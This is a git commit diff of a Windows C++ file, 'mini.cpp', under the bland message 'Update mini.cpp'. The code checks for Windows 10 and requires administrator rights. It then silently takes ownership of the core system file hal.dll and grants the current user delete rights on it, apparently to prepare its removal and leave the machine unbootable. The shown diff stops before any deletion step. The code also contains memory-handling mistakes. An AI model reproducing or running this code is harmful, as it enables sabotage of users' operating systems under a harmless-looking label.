a1a4f3641e8611e6ab9c0ea36bfb762f923d6747
Адриан <ttfh3500@gmail.com>
2018-03-04 12:25:49 -0300

    Update mini.cpp

--- mini.cpp
+++ mini.cpp
@@ -1,38 +1,46 @@
+//#include <stdlib.h>
+//#include <string.h>
+//#include <windows.h>
+
 #include <stdio.h>
 #include <shlobj.h>
 #include <lmcons.h>
 
 void Initialize() {
   system("ver > version");
-  unsigned int major, minor;
-  char* strver = new char[8];
-  FILE* ver = fopen("version", "r");
-  fscanf(ver, "\nMicrosoft Windows [%s %u.%u.", strver, &major, &minor);
+  FILE* ver = fopen("version", "rb");
+  fseek(ver, 0, SEEK_END);
+  long size = ftell(ver);
+  rewind(ver);
+  char* buffer = new char[size];
+  fread(buffer, 1, size, ver);
+
+  char digits[] = "1234567890";
+  int pos = strcspn(buffer, digits);
+  int major = int(atof(&buffer[pos]) * 10) / 10;
+//  int minor = int(atof(&buffer[pos]) * 10) % 10;
   fclose(ver);
+  delete[] buffer;
   remove("version");
-  delete strver;
+
   if (major != 10) return;
   if (!IsUserAnAdmin()) {
     MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
     exit(EXIT_FAILURE);
   }
-  const char* file = "C:\\Windows\\System32\\hal.dll";
-  char* takeown = new char[strlen(file) + 22];
-  strcpy(takeown, "TAKEOWN /F ");
-  strcat(takeown, file);
-  strcat(takeown, " >nul 2>&1");
-  system(takeown);
-  delete takeown;
 
   DWORD length = UNLEN + 1;
   char username[UNLEN + 1];
   GetUserName(username, &length);
+  const char* file = "C:\\Windows\\System32\\hal.dll";
+
+  char* takeown = new char[strlen(file) + 22];
+  sprintf(takeown, "takeown /f %s >nul 2>&1", file);
+  system(takeown);
+  delete takeown;
+
   char* grant = new char[strlen(file) + length + 28];
-  strcpy(grant, "ICACLS ");
-  strcat(grant, file);
-  strcat(grant, " /GRANT ");
-  strcat(grant, username);
-  strcat(grant, ":D >nul 2>&1");
+  sprintf(grant, "icacls %s /grant %s:D >nul 2>&1", file, username);
   system(grant);
   delete grant;
 
